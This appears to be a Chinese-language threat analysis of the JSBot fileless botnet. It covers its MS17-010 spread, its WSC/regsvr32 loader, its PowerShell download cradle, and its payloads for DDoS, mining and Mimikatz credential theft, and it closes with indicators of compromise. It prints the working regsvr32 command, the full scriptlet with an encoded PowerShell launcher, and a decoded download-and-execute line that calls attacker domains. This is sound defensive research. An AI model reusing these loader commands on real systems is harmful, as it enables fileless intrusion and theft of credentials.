> 原文链接: https://www.anquanke.com//post/id/249104 


# JSBot无文件攻击分析


                                阅读量   
                                **33966**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t016cc852e99271d391.png)](https://p4.ssl.qhimg.com/t016cc852e99271d391.png)



## 概述

近日，阿里云安全监测到一种利用Javascript无文件技术实现C&amp;C通信的新型僵尸网络，其核心交互无文件落盘并由JS加载下载Powershell脚本内存执行各类恶意操作，由于核心使用了WSC技术我们将其命名为JSBot。

阿里云安全专家分析发现，该僵尸网络利用永恒之蓝漏洞进行扫描入侵，通过WSC(Windows Scripting Component)技术下载并执行核心Powershell脚本，实现文件下载、上传、对外DDoS、挖矿、盗取密码等功能，对主机、用户资产危害极大。

阿里云安全持续对该BOT进行监控，发现近期传播有所上升，提醒广大用户注意防护。

[![](https://p4.ssl.qhimg.com/t0178cea24554993acc.png)](https://p4.ssl.qhimg.com/t0178cea24554993acc.png)



## 传播手段

JSBOT通过MS17-010漏洞进行入侵和传播，利用WSC技术实现无文件化的维持和后续攻击，通过从云端下载经过编码的二进制文件，实现对外DDoS和挖矿行为，通过Powershell核心函数实现对失陷主机的下载、发送文件、WMIExec等功能。

[![](https://p3.ssl.qhimg.com/t0135ca252f9335843c.jpg)](https://p3.ssl.qhimg.com/t0135ca252f9335843c.jpg)

### <a class="reference-link" name="%E9%98%B6%E6%AE%B5%E5%88%86%E6%9E%90"></a>阶段分析

[![](https://p3.ssl.qhimg.com/t01395c823f545ac32e.jpg)](https://p3.ssl.qhimg.com/t01395c823f545ac32e.jpg)



## 详细分析

JSBot通过MS17-010漏洞入侵主机内部后，通过进行svchost.exe执行命令派生cmd进程。该命令从域名cat.xiaoshabi.nl下载一段XML文件，该文件使用JavaScript编写的COM组件WSC(Windows Scripting Component)，由于脚本文件不能被编译，只能运行于Windows系统的脚本宿主机WSH(Windows Scripting Host)中，全程文件不落盘，这也给文件查杀、木马清理带来了难度。其执行的命令如下

`C:\\Windows\\system32\\regsvR32.EXE /u/s/i:http://cat.xiaoshabi.nl/networks.xsl scrobj.dll`

文件名为networks.xsl的XML文件内容如下，通过新建 ActiveXObject(“WScript.Shell”).Run(ps,0,true) 执行一段powershell经过Base64加密的脚本

```
&lt;?XML version=”1.0”?&gt;

&lt;scriptlet&gt;

&lt;registration
progid="Test"
classid="`{`10001111-0000-0000-0000-0000FEEDACDC`}`" &gt;
&lt;!-- Learn from Casey Smith @subTee --&gt;
&lt;script language="JScript"&gt;
&lt;![CDATA[
ps = “cmd.exe /c powershell.exe -nop -noni -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAGkAeAAuAHgAaQBhAG8AagBpAGoAaQAuAG4AbAAvAG4AZQB0AHcAbwByAGsAcwAuAHAAcwAxACcAKQApAA==”;
new ActiveXObject(“WScript.Shell”).Run(ps,0,true);
]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
```

其中命令部分经base64解码后内容如下，JSBot从 six.xiaojiji.nl 域名下载进过混淆的脚本 networks.ps1

`IEX ((new-object net.webclient).downloadstring('http://six.xiaojiji.nl/networks.ps1'))`

networks.ps1包含三个参数，参数经过过base64或混淆

[![](https://p0.ssl.qhimg.com/t01f47b22e55c12a98a.jpg)](https://p0.ssl.qhimg.com/t01f47b22e55c12a98a.jpg)

对文件进行解码后参数功能可以归结如下

[![](https://p1.ssl.qhimg.com/t012bf003bb889d8c8b.jpg)](https://p1.ssl.qhimg.com/t012bf003bb889d8c8b.jpg)

#### <a class="reference-link" name="%24ffffff%E8%A7%A3%E7%A0%81%E5%87%BA%E7%9A%84%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0"></a>$ffffff解码出的核心函数

函数Download_File，调用[System.IO.File]::WriteAllBytes(“$env:temp$Filename”, $temp)从失陷主机下载文件

[![](https://p3.ssl.qhimg.com/t014e03a48f03242447.jpg)](https://p3.ssl.qhimg.com/t014e03a48f03242447.jpg)

函数RunDDOS，从 [http://xxx.xxx.xxx.xxx/cohernece.txt](http://xxx.xxx.xxx.xxx/cohernece.txt) 下载DDOS文件到C:\Windows\TEMP\cohernece.exe目录并执行

[![](https://p1.ssl.qhimg.com/t019daac3f181dc0b3d.jpg)](https://p1.ssl.qhimg.com/t019daac3f181dc0b3d.jpg)

函数RunXMR，从 [http://xxx.xxx.xxx.xxx/steam.txt](http://xxx.xxx.xxx.xxx/steam.txt) 下载挖矿木马并执行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e026c36a2203596f.jpg)

函数Get-creds，盗取内存中的秘钥

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0181f588ca7de1a7f5.jpg)

函数Scan,利用MS17-010对外进行扫描

[![](https://p1.ssl.qhimg.com/t011ead2fbaf09f6d5d.jpg)](https://p1.ssl.qhimg.com/t011ead2fbaf09f6d5d.jpg)

整体解码后可以得到JSBot如下核心功能

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011ff20c7e4f26cc7d.jpg)

#### <a class="reference-link" name="%24miiiiii%E5%8F%82%E6%95%B0%E8%A7%A3%E7%A0%81%E4%BA%8C%E8%BF%9B%E5%88%B6"></a>$miiiiii参数解码二进制

Dll导出函数中包含powershell_reflective_mimikatz

[![](https://p2.ssl.qhimg.com/t015ce618d63401516b.jpg)](https://p2.ssl.qhimg.com/t015ce618d63401516b.jpg)

文件中对该Mimikatz工具进行了集成

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013ae2bee470fffee1.jpg)



## 逃逸手段分析

JSBot为了规避检测在整体流程中采用了多种组合方式，其中比较典型的有以下几类

#### <a class="reference-link" name="%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E5%8C%96%E8%BF%90%E8%A1%8C"></a>无文件内存化运行

JSBot通过regsvR32执行命令，调用scrobj.dll的DllInstall函数，将URL中所带的COM组件写入注册表中，由于脚本运行于Windows平台上的脚本宿主机WSH(Widnows Scripting Host)，故文件可以不落盘。

`C:\\Windows\\system32\\regsvR32.EXE /u/s/i:http://cat.xiaoshabi.nl/networks.xsl scrobj.dll`

而在Powershell脚本中JSBot通过一系列函数在内存空间中将PE写入，同样实现了无文件落盘的操作，如图写内存函数

[![](https://p3.ssl.qhimg.com/t01df51a75434a8f0ac.jpg)](https://p3.ssl.qhimg.com/t01df51a75434a8f0ac.jpg)

程序执行入口

[![](https://p2.ssl.qhimg.com/t01dd05db879cbcfed8.jpg)](https://p2.ssl.qhimg.com/t01dd05db879cbcfed8.jpg)

JSBot使用WMIExec来远程执行命令，Windows系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入磁盘。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017bd498faacffd024.jpg)

#### <a class="reference-link" name="%E8%84%9A%E6%9C%AC%E5%A4%9A%E5%B1%82%E5%A4%9A%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86"></a>脚本多层多类型混淆

JSBot对核心函数做了两次混淆，核心功能在参数$ffffff中，同时针对Powershell使用了任意大小写、反引号、拼接等多种混淆手段，增加分析和检测难度。

[![](https://p5.ssl.qhimg.com/t013c72eb44b9eceba3.jpg)](https://p5.ssl.qhimg.com/t013c72eb44b9eceba3.jpg)

#### <a class="reference-link" name="%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E5%86%85%E5%AD%98%E8%BF%98%E5%8E%9F"></a>二进制编码内存还原

JSBot从远程服务下载二进制时，对二进制文件进行了文本化，以逃避网络侧流量的检测，在脚本中再进行解码还原，如下为下载的DDoS木马。

[![](https://p5.ssl.qhimg.com/t0124ff78722b282de1.jpg)](https://p5.ssl.qhimg.com/t0124ff78722b282de1.jpg)

Powershell中对二进制文件进行还原函数如下

[![](https://p2.ssl.qhimg.com/t01d436b8bea513db00.jpg)](https://p2.ssl.qhimg.com/t01d436b8bea513db00.jpg)



## IOC

IP<br>
5.180.96.187<br>
Domain<br>
cat.dashabi.in<br>
skt.dashabi.nl<br>
safe.lxb.monster<br>
cat.xiaojiji.nl<br>
skt.xiaojiji.nl<br>
sec.xiaojiji.nl<br>
URL<br>
hxxp://cat.dashabi.in/networks.xsl<br>
hxxp://sec.dashabi.in/javaw2/net/net.xsl<br>
hxxp://sec.dashabi.in/javaw2/instance.xsl<br>
hxxp://skt.dashabi.nl/networks.xsl<br>
hxxp://cat.xiaojiji.nl/cohernece.txt<br>
hxxp://cat.xiaojiji.nl/sys.txt<br>
hxxp://skt.xiaojiji.nl/ver.txt<br>
hxxp://cat.xiaojiji.nl/access.txt<br>
hxxp://cat.xiaojiji.nl/monhash.txt<br>
hxxp://cat.xiaojiji.nl/net/net.xsl<br>
hxxp://cat.xiaojiji.nl/minhash.txt<br>
hxxp://cat.xiaojiji.nl/nssmhash.txt<br>
hxxp://cat.xiaojiji.nl/uas.txt<br>
hxxp://cat.xiaojiji.nl/nssm.txt<br>
hxxp://cat.xiaojiji.nl/ver.txt<br>
hxxp://cat.xiaojiji.nl/min.txt<br>
hxxp://cat.xiaojiji.nl/mon.txt<br>
hxxp://sec.xiaojiji.nl/javaw2/instance.ps1<br>
hxxp://sec.xiaojiji.nl/javaw2/javaw<br>
hxxp://sec.xiaojiji.nl/javaw2/WinRing0x64.sys<br>
hxxp://cat.xiaojiji.nl/networks.ps1<br>
hxxp://cat.xiaojiji.nl/networks.xsl<br>
hxxp://cat.xiaojiji.nl:80/net/net.xsl<br>
hxxp://sec.xiaojiji.nl/javaw2/net/net.xsl<br>
hxxp://six.xiaojiji.nl/networks.ps1<br>
hxxp://six.xiaojiji.nl/networks.xsl<br>
hxxp://skt.xiaojiji.nl/list.ps1<br>
hxxp://skt.xiaojiji.nl/networke.ps1<br>
hxxp://skt.xiaojiji.nl/networke.xsl<br>
hxxp://skt.xiaojiji.nl/networks.ps1<br>
hxxp://skt.xiaojiji.nl/networks.xsl<br>
hxxp://safe.lxb.monster/networke.xsl<br>
hxxp://safe.lxb.monster/networks.xsl<br>
MD5<br>
fdf5976964d0c42e4f5b490a2a7dd0c6<br>
8c26218931c743a36987e07af7fc35f4<br>
0ef5da9757386de38b1eb20e1ba0dc45
